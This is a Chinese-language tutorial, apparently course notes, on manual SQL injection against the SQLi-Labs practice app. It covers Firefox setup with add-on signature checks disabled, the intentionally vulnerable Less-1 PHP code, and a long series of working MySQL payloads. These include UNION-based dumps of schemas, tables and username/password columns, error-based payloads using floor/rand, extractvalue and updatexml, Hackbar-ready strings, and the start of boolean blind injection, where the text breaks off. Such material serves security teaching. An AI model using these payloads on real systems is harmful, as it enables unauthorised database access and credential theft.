Edition</code>一定要<strong>断网！断网！断网！</strong>因为火狐的策略问题，默认会自动更新，联网安装的话，刚刚安装完的时候就会被强制更新最新版本了，所以断网安装大法保平安。安装完成后，设置里面勾选<code>不检查更新</code>。然后就可以恢复联网了</p><p><strong>允许第三方插件</strong></p><p>火狐安全策略的原因是无法顺利安装一些第三方插件的，得手动去高级选项里面关闭一下，浏览器打开：</p><p><a href="about:config" target="_blank" rel="noopener">about:config</a></p><p>点击<code>我了解此风险</code>：</p><p><img src="https://dn-coding-net-tweet.codehub.cn/photo/2019/e13f866e-3f89-4cb8-b8f8-962814555b20.jpg" alt="img"></p><p>鼠标下滑，找到倒数第3和第4个选项，即<code>xpinstall.signatures.required</code>和<code>xpinstall.whitelist.required</code>，将值切换为<code>false</code>：</p><p><img src="https://dn-coding-net-tweet.codehub.cn/photo/2019/8a6db6e0-e26d-496f-b939-fab5711ca81a.jpg" alt="img"></p><p>然后就可以愉快地安装一些第三方插件了</p><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><p>自动化注入必备神器</p><p><strong>项目地址</strong>：<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>在实战中基本上都是靠 SQLMap 因为纯手工盲注得注入到天荒地老 手工注入只是加深对注入的原理的理解</p><h1 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h1><h2 id="SQLi-Labs-Less1"><a href="#SQLi-Labs-Less1" class="headerlink" title="SQLi-Labs Less1"></a>SQLi-Labs Less1</h2><p>Less1 是一个非常经典的 SQL的注入漏洞类型，这里就来演示讲解一下手工注入的流程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="comment">// 输出所有查询的数据，从结果集中取得一行作为关联数组 如果没有更多行则返回 false</span></span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="推测SQL语句"><a href="#推测SQL语句" class="headerlink" title="推测SQL语句"></a>推测SQL语句</h2><p>尝试构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure><p>这样MySQL语句就变成了这样了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>所以我们会看到这样的提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">on for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br><span class="line"></span><br><span class="line">&apos;&apos;1&apos;&apos; LIMIT 0,1&apos;</span><br><span class="line"></span><br><span class="line">&apos;1&apos;&apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">1&apos;</span><br></pre></td></tr></table></figure><p>反推测出代码中的 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">''</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="闭合注入"><a href="#闭合注入" class="headerlink" title="闭合注入"></a>闭合注入</h2><p>我们前面输入的 引号<code>&#39;</code>被闭合了，但是没有闭合后面的引号，导致后面的引号报错了，尝试闭合试试看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=1' and '1'='1</span><br></pre></td></tr></table></figure><p>这样MySQL语句就变成了这样了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>此时完美毕业，页面应该是正常响应的。</p><h2 id="注释注入"><a href="#注释注入" class="headerlink" title="注释注入"></a>注释注入</h2><p>因为使用<code>GET</code>传递值的时候，浏览器会自动帮我们进行 URL 解码，所以经常如下使用：</p><p>构造一个报错的页面：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 %23</span><br><span class="line">and 1=2 %23</span><br><span class="line">and 1=1 <span class="comment">--+</span></span><br><span class="line">and 1=2 <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">' and 1=1 %23</span><br><span class="line">' and 1=2 %23</span><br><span class="line">' and 1=1 <span class="comment">--+</span></span><br><span class="line">' and 1=2 <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">" and 1=1 %23</span><br><span class="line">" and 1=2 %23</span><br><span class="line">" and 1=1 <span class="comment">--+</span></span><br><span class="line">" and 1=2 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>构造一个延时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' and sleep(10) %23</span><br><span class="line">' and sleep(10) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>所以在 <code>POST</code> 注入的时候 我们常直接使用 <code>#</code> 来注释语句</p><h2 id="判断字段数目"><a href="#判断字段数目" class="headerlink" title="判断字段数目"></a>判断字段数目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ order by 1 --+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id=1’ order by 10--+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id=1’ order by 5 --+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id=1’ order by 3 --+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id=1’ order by 4 --+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure><p>数学里面的二分对半查找，用以确定字段数目。</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><code>UNION SELECT</code> 联合查询，手工注入经典语句，作用是在后面通过<code>UNION</code>把我们的恶意注入语句接上去，带入数据库进行查询。 因为字段数目是:<code>3</code>,那么正规的语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; UNION SELECT 1,2,3 --+</span><br></pre></td></tr></table></figure><p>这里页面是不会报错的，此时我们带入数据库的语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&apos;1&apos; UNION SELECT 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555994572407.png" alt="1555994572407"></p><p>使用and语句故意构造报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos; and 1=2 union select 1,2,3 --+&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>使用利用数据本身构造报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3 --+&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/image-20200510151630128.png" alt="image-20200510151630128"></p><p>来看下数据库的语句情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=<span class="string">'-1'</span> UNION SELECT 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>其字段内容可以在页面显示，不一定要用union select 1,2,3形式</p><h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><p>在对应字段放入要查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库版本和用户信息</span><br><span class="line">and 1=2 union select 1,version(),user() --+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库和系统版本</span><br><span class="line">and 1=2 union select 1,database(),@@version_compile_os --+</span><br></pre></td></tr></table></figure><h2 id="课堂思考问题"><a href="#课堂思考问题" class="headerlink" title="课堂思考问题"></a>课堂思考问题</h2><ul><li>为什么 order by 可以判断字段数？</li><li>为什么先判断字段数才可再使用 union 联合查询？</li><li>为什么联合查询不配合报错看不到回显信息？</li><li>为什么联合查询爆出的字段可以用来利用？非要用 union select 1,2,3 形式吗？</li></ul><h2 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h2><blockquote><p>需要注意插入位置 中间字段的话 需要手动分开语句</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator 0x3c62723e) from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator &apos;&lt;br&gt;&apos;) from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator &apos;:&apos;) from information_schema.schemata;</span><br></pre></td></tr></table></figure><p>手动去数据库的表里查看下数据。</p><p>information_schema 数据库下的 <code>schemata</code>表中的<code>schema_name</code>记录的是各个<code>数据库</code>的名称:</p><p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555996943051.png" alt="1555996943051"></p><h2 id="查看当前数据库表名"><a href="#查看当前数据库表名" class="headerlink" title="查看当前数据库表名"></a>查看当前数据库表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p><code>tables</code>表中的<code>table_name</code>列记录了所有的<strong>表名</strong></p><p><code>tables</code>表中的<code>table_schema</code>列记录了所有的<strong>数据库名</strong></p><p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555997320108.png" alt="1555997320108"></p><h2 id="查看其他数据库表名"><a href="#查看其他数据库表名" class="headerlink" title="查看其他数据库表名"></a>查看其他数据库表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 用引号</span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;</span><br><span class="line"></span><br><span class="line"># hex编码</span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=0x776F6F79756E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=unhex(7365637572697479)</span><br></pre></td></tr></table></figure><h2 id="查询当前数据库下的-users-表的列名"><a href="#查询当前数据库下的-users-表的列名" class="headerlink" title="查询当前数据库下的 users 表的列名"></a>查询当前数据库下的 users 表的列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;</span><br></pre></td></tr></table></figure><h2 id="查询其他数据库下表的列名"><a href="#查询其他数据库下表的列名" class="headerlink" title="查询其他数据库下表的列名"></a>查询其他数据库下表的列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;;</span><br></pre></td></tr></table></figure><h2 id="查询当前库下的字段值"><a href="#查询当前库下的字段值" class="headerlink" title="查询当前库下的字段值"></a>查询当前库下的字段值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(id,username,password) from users</span><br></pre></td></tr></table></figure><h2 id="查询其他库下的字段值"><a href="#查询其他库下的字段值" class="headerlink" title="查询其他库下的字段值"></a>查询其他库下的字段值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(字段名) from 数据库名.表名</span><br></pre></td></tr></table></figure><h1 id="Hackbar-半自动化注入"><a href="#Hackbar-半自动化注入" class="headerlink" title="Hackbar 半自动化注入"></a>Hackbar 半自动化注入</h1><p>回到刚刚的 Less 1 ，下面全程尝试使用 Hackbar 来进行手工注入查询：</p><h2 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(schema_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.SCHEMATA),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="查询当前数据库的表名"><a href="#查询当前数据库的表名" class="headerlink" title="查询当前数据库的表名"></a>查询当前数据库的表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="keyword">WHERE</span>+TABLE_SCHEMA=<span class="keyword">DATABASE</span>()),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="查询-users-表的列名"><a href="#查询-users-表的列名" class="headerlink" title="查询 users 表的列名"></a>查询 users 表的列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="keyword">WHERE</span>+TABLE_NAME=<span class="number">0x7573657273</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="查询-username-password-的字段值"><a href="#查询-username-password-的字段值" class="headerlink" title="查询 username,password 的字段值"></a>查询 username,password 的字段值</h2><p>最后一步 也就是 dump 数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(username,<span class="keyword">password</span>+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+<span class="keyword">users</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="查询其他数据库的表名"><a href="#查询其他数据库的表名" class="headerlink" title="查询其他数据库的表名"></a>查询其他数据库的表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="keyword">WHERE</span>+TABLE_SCHEMA=<span class="number">0x6368616c6c656e676573</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>查询出的表名为：<strong>1j9hvmml6l</strong></p><h2 id="查询其他数据库的表名下的列名"><a href="#查询其他数据库的表名下的列名" class="headerlink" title="查询其他数据库的表名下的列名"></a>查询其他数据库的表名下的列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="keyword">WHERE</span>+TABLE_NAME=<span class="number">0x316a3968766d6d6c366c</span>+<span class="keyword">and</span>+table_schema=<span class="string">'challenges'</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h1 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h1><p>报错注入利用条件是<strong>网站开启了 SQL 报错日志功能</strong>，否则无法使用报错注入，具有一定的局限性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_error()</span><br></pre></td></tr></table></figure><p>一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure><p>利用了 MySQL 的第 8652 号 Bug ：Bug #8652 group by part of rand() returns duplicate key error 来进行的盲注，使得 MySQL 由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果</p><blockquote><p>报错注入因为日志报错问题只能报一行</p></blockquote><h2 id="xpath-语法错误"><a href="#xpath-语法错误" class="headerlink" title="xpath 语法错误"></a>xpath 语法错误</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line"></span><br><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br></pre></td></tr></table></figure><h2 id="重复特性"><a href="#重复特性" class="headerlink" title="重复特性"></a>重复特性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure><h2 id="Hackbar-Payload"><a href="#Hackbar-Payload" class="headerlink" title="Hackbar Payload"></a>Hackbar Payload</h2><p>报错注入比较简单粗暴，无需构造 Union select 语句了，直接闭合/注释掉 SQL 语句即可注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># version</span><br><span class="line">+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1</span><br><span class="line"></span><br><span class="line"># database</span><br><span class="line">+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># tables</span><br><span class="line">+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># columns</span><br><span class="line">+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x7573657273+AND+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># data</span><br><span class="line">+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br></pre></td></tr></table></figure><p>手动进行数据偏移来查询下一条数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT+0,1</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200510172820746.png" alt="image-20200510172820746"></p><h1 id="布尔类型盲注"><a href="#布尔类型盲注" class="headerlink" title="布尔类型盲注"></a>布尔类型盲注</h1><h2 id="盲注的概念"><a href="#盲注的概念" class="headerlink" title="盲注的概念"></a>盲注的概念</h2><p>页面无法进行显示 SQL 查询的数据，导致之前使用的显错注入就无法成功注入。</p><p>盲注就是在 SQL 注入过程中，SQL 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p><h2 id="盲注的原理"><a href="#盲注的原理" class="headerlink" title="盲注的原理"></a>盲注的原理</h2><p><strong>获取数据库长度</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># security 8位</span></span><br><span class="line">and length(database())&gt;7</span><br><span class="line">and length(database())&gt;8</span><br></pre></td></tr></table></figure><p><strong>LEFT函数</strong></p><p><code>LEFT(s,n)</code>返回字符串 s 的前 n 个字符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第1位</span></span><br><span class="line">left(database(),1)&gt;'a';</span><br><span class="line">left(database(),1)&gt;'z';</span><br><span class="line">left(database(),1)&gt;'e';</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2位</span></span><br><span class="line">left(database(),2)&gt;'sa';</span><br><span class="line">left(database(),2)&gt;'sz';</span><br><span class="line">left(database(),2)&gt;'se';</span><br></pre></td></tr></table></figure><p><strong>MID函数</strong></p><p><code>MID(s,n,len)</code>从字符串 s 的 start 位置截取长度为 length 的子字符串</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第1位</span></span><br><span class="line">and mid(user(),1,1)&gt;'a' ;</span><br><span class="line">and mid(user(),1,1)&gt;'z' ;</span><br><span class="line">and mid(user(),1,1)&gt;'q' ;</span><br><span class="line">and mid(user(),1,1)&gt;'r' ;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2位</span></span><br><span class="line">and mid(user(),1,2)&gt;'rn' ;</span><br><span class="line">and mid(user(),1,2)&gt;'ro' ;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者这样</span></span><br><span class="line">and mid(user(),2,1)&gt;'n'</span><br><span class="line">and mid(user(),2,1)&gt;'0'</span><br></pre></td></tr></table></figure><p><strong>SUBSTR函数</strong></p><p><code>SUBSTR(s, start, length)</code>从字符串 s 的 start 位置截取长度为 length 的子字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and substr(version(),1,1)&gt;4;</span><br><span class="line">and 